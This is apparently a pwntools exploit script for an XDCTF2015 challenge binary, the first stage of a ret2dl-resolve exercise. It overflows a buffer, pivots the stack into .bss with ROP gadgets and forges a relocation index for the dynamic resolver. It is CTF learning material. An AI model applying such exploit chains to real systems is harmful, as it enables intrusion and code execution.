from pwn import *
elf = ELF('./parelro_x86')
offset = 112
read_plt = elf.plt['read']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
plt_0 = 0x08048380 # objdump -d -j .plt bof  执行 <push link_map，jmp dl_resolve>
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = 0x20 # write's index

base_stage = bss_addr + stack_size

r = process('./parelro_x86')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = b'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = b"/bin/sh"

# stage1: 栈迁移，调plt[0]，伪造栈上的 index_offset
# --------> base_stage
payload2 = b'AAAA' # 接上一个payload的leave->pop ebp ; ret
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

r.sendline(payload2)
r.interactive()